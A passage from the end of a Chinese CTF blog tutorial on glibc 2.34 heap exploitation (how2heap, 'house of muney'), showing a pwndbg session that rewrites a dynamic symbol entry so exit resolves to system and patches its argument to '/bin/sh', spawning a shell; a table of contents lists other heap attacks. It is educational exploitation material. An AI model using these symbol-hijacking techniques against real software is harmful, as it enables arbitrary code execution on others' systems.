<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p *sym</span><br><span class="line">Cannot access memory at address 0x0</span><br><span class="line"><span class="meta">pwndbg&gt;</span> set sym=(const Elf64_Sym *) 0x7ffff79f5bc0</span><br><span class="line"><span class="meta">pwndbg&gt;</span> set *sym=&#123;10919,34,0,13,290456,41&#125;</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p *sym</span><br><span class="line"><span class="meta">$</span>3 = &#123;</span><br><span class="line">  st_name = 10919, </span><br><span class="line">  st_info = 34 '"', </span><br><span class="line">  st_other = 0 '\000', </span><br><span class="line">  st_shndx = 13, </span><br><span class="line">  st_value = 290456, </span><br><span class="line">  st_size = 41</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx sym</span><br><span class="line">0x7ffff79f5bc0:	0x000d002200002aa7	0x0000000000046e98</span><br><span class="line">0x7ffff79f5bd0:	0x0000000000000029	0x0000000000000000</span><br><span class="line">0x7ffff79f5be0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff79f5bf0:	0x0000000000000000	0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span> n</span><br></pre></td></tr></table></figure>
<p>这时候<code>c</code>继续运行，原本exit处的偏移被我们修补为system的偏移。成功劫持程序寻找system符号的偏移和真实地址。原本按照道理到这里继续运行就可以getshell了，但我没有，程序一直<code>exit with code 0177</code>。经过漫长的一步一步的跟踪调试，我发现system获得的参数不对。下面我们继续修补参数。<br>可以看到程序经过<code>glibc-2.34/elf/dl-runtime.c</code>、<code>glibc-2.34/sysdeps/x86_64/dl-trampoline.h</code>进入了system.c函数：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_system1.png" alt><br>查看参数<code>line</code>：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p line</span><br><span class="line"><span class="meta">$</span>4 = 0x2f &lt;error: Cannot access memory at address 0x2f&gt;</span><br></pre></td></tr></table></figure></p>
<p>参数是错误的。没关系我们可以修补它。上面保存过<code>/bin/sh</code>字符串的地址，现在可以用上了：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> set line=(long long*)0x555555554854</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p *line</span><br><span class="line"><span class="meta">$</span>5 = 47 '/'</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/gx line</span><br><span class="line">0x555555554854:	0x0068732f6e69622f</span><br></pre></td></tr></table></figure></p>
<p><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_system2.png" alt><br>到这里后单步s进入。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_system4.png" alt><br>这里调用了参数line，查看一下是否正确：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p line</span><br><span class="line"><span class="meta">$</span>6 = 0x555555554854 "/bin/sh"</span><br></pre></td></tr></table></figure>
<p>非常好，是正确的。然后<code>c</code>继续运行，会获得一个新的shell进程。程序顺利执行<code>system(&quot;/bin/sh&quot;)</code>获得shell：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_shell.png" alt></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/pwn/" rel="tag"># pwn</a>
          
            <a href="/tags/CTF/" rel="tag"># CTF</a>
          
            <a href="/tags/堆溢出/" rel="tag"># 堆溢出</a>
          
            <a href="/tags/Linux/" rel="tag"># Linux</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2022/03/21/百度网盘真实下载地址的一些想法/" rel="next" title="百度网盘真实下载地址的一些想法">
                <i class="fa fa-chevron-left"></i> 百度网盘真实下载地址的一些想法
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/zql.jpg" alt="尘林">
            
              <p class="site-author-name" itemprop="name">尘林</p>
              <p class="site-description motion-element" itemprop="description">势，只会裹挟随波逐流之人。一心既定，便不问大势所趋。</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">31</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">11</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">63</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#how2heap深入浅出学习堆利用（一）"><span class="nav-number">1.</span> <span class="nav-text">how2heap深入浅出学习堆利用（一）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境配置"><span class="nav-number">1.2.</span> <span class="nav-text">环境配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#下载安装patchelf"><span class="nav-number">1.2.1.</span> <span class="nav-text">下载安装patchelf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#下载glibc"><span class="nav-number">1.2.2.</span> <span class="nav-text">下载glibc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#前置知识补充"><span class="nav-number">1.3.</span> <span class="nav-text">前置知识补充</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#进程布局"><span class="nav-number">1.3.1.</span> <span class="nav-text">进程布局</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc-chunk结构"><span class="nav-number">1.3.2.</span> <span class="nav-text">malloc_chunk结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分配区"><span class="nav-number">1.3.3.</span> <span class="nav-text">分配区</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#空闲-chunk-容器——bins"><span class="nav-number">1.3.4.</span> <span class="nav-text">空闲 chunk 容器——bins</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc过程"><span class="nav-number">1.3.5.</span> <span class="nav-text">malloc过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#free过程"><span class="nav-number">1.3.6.</span> <span class="nav-text">free过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-dup-glibc2-34"><span class="nav-number">1.4.</span> <span class="nav-text">fastbin_dup_glibc2.34</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-number">1.4.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC"><span class="nav-number">1.4.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwndbg调试"><span class="nav-number">1.4.3.</span> <span class="nav-text">pwndbg调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-house-of-spirit-glibc2-34"><span class="nav-number">1.5.</span> <span class="nav-text">tcache house of spirit glibc2.34</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理-1"><span class="nav-number">1.5.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-1"><span class="nav-number">1.5.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tcache-bin结构"><span class="nav-number">1.5.3.</span> <span class="nav-text">tcache bin结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwndbg"><span class="nav-number">1.5.4.</span> <span class="nav-text">pwndbg</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#overlapping-chunks-glibc2-34"><span class="nav-number">1.6.</span> <span class="nav-text">overlapping chunks glibc2.34</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理-2"><span class="nav-number">1.6.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-2"><span class="nav-number">1.6.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwndbg调试-1"><span class="nav-number">1.6.3.</span> <span class="nav-text">pwndbg调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsafe-unlink-glibc2-34"><span class="nav-number">1.7.</span> <span class="nav-text">unsafe_unlink_glibc2.34</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理-3"><span class="nav-number">1.7.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-3"><span class="nav-number">1.7.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwndbg调试-2"><span class="nav-number">1.7.3.</span> <span class="nav-text">pwndbg调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#一个小例题"><span class="nav-number">1.7.4.</span> <span class="nav-text">一个小例题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-poisoning-glibc2-34"><span class="nav-number">1.8.</span> <span class="nav-text">tcache_poisoning_glibc2.34</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理-4"><span class="nav-number">1.8.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-4"><span class="nav-number">1.8.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwndbg调试-3"><span class="nav-number">1.8.3.</span> <span class="nav-text">pwndbg调试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#how2heap深入浅出学习堆利用（二）"><span class="nav-number">2.</span> <span class="nav-text">how2heap深入浅出学习堆利用（二）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fast-bin-reverse-into-tcache-glibc2-34"><span class="nav-number">2.1.</span> <span class="nav-text">fast_bin_reverse_into_tcache_glibc2.34</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理-5"><span class="nav-number">2.1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-5"><span class="nav-number">2.1.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwndbg调试-4"><span class="nav-number">2.1.3.</span> <span class="nav-text">pwndbg调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-stashing-unlink-attack-glibc2-34"><span class="nav-number">2.2.</span> <span class="nav-text">tcache_stashing_unlink_attack_glibc2.34</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理-6"><span class="nav-number">2.2.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-6"><span class="nav-number">2.2.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwngdb调试"><span class="nav-number">2.2.3.</span> <span class="nav-text">pwngdb调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-botcake-glibc2-34"><span class="nav-number">2.3.</span> <span class="nav-text">house_of_botcake_glibc2.34</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理-7"><span class="nav-number">2.3.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-7"><span class="nav-number">2.3.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwndbg调试-5"><span class="nav-number">2.3.3.</span> <span class="nav-text">pwndbg调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#large-bin-attack-glibc2-34"><span class="nav-number">2.4.</span> <span class="nav-text">large_bin_attack_glibc2.34</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理-8"><span class="nav-number">2.4.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-8"><span class="nav-number">2.4.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwndbg调试-6"><span class="nav-number">2.4.3.</span> <span class="nav-text">pwndbg调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#decrypt-safe-linking-glibc2-34"><span class="nav-number">2.5.</span> <span class="nav-text">decrypt_safe_linking_glibc2.34</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理-9"><span class="nav-number">2.5.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-9"><span class="nav-number">2.5.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwndbg调试-7"><span class="nav-number">2.5.3.</span> <span class="nav-text">pwndbg调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#暴力破解"><span class="nav-number">2.5.4.</span> <span class="nav-text">暴力破解</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#how2heap深入浅出学习堆利用（三）"><span class="nav-number">3.</span> <span class="nav-text">how2heap深入浅出学习堆利用（三）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#poison-null-byte-glibc2-34"><span class="nav-number">3.1.</span> <span class="nav-text">poison_null_byte_glibc2.34</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理-10"><span class="nav-number">3.1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-10"><span class="nav-number">3.1.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwndbg调试-8"><span class="nav-number">3.1.3.</span> <span class="nav-text">pwndbg调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-lore-glibc2-34"><span class="nav-number">3.2.</span> <span class="nav-text">house_of_lore_glibc2.34</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理-11"><span class="nav-number">3.2.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-11"><span class="nav-number">3.2.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwndbg调试-9"><span class="nav-number">3.2.3.</span> <span class="nav-text">pwndbg调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-einherjar-glibc2-34"><span class="nav-number">3.3.</span> <span class="nav-text">house_of_einherjar_glibc2.34</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理-12"><span class="nav-number">3.3.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-12"><span class="nav-number">3.3.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwndbg调试-10"><span class="nav-number">3.3.3.</span> <span class="nav-text">pwndbg调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-mind-fastbin-glibc2-34"><span class="nav-number">3.4.</span> <span class="nav-text">house_of_mind_fastbin_glibc2.34</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理-13"><span class="nav-number">3.4.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-13"><span class="nav-number">3.4.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwndbg调试-11"><span class="nav-number">3.4.3.</span> <span class="nav-text">pwndbg调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mmap-overlapping-chunks-glibc2-34"><span class="nav-number">3.5.</span> <span class="nav-text">mmap_overlapping_chunks_glibc2.34</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理-14"><span class="nav-number">3.5.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-14"><span class="nav-number">3.5.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwndbg调试-12"><span class="nav-number">3.5.3.</span> <span class="nav-text">pwndbg调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#拓展应用-——-house-of-muney"><span class="nav-number">3.5.4.</span> <span class="nav-text">拓展应用 —— house of muney</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#原理-15"><span class="nav-number">3.5.4.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#预备知识"><span class="nav-number">3.5.4.2.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#调试模式设置"><span class="nav-number">3.5.4.3.</span> <span class="nav-text">调试模式设置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#覆盖libc"><span class="nav-number">3.5.4.4.</span> <span class="nav-text">覆盖libc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#开始对比调试"><span class="nav-number">3.5.4.5.</span> <span class="nav-text">开始对比调试</span></a></li></ol></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">尘林</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
  


  

  

</body>
</html>
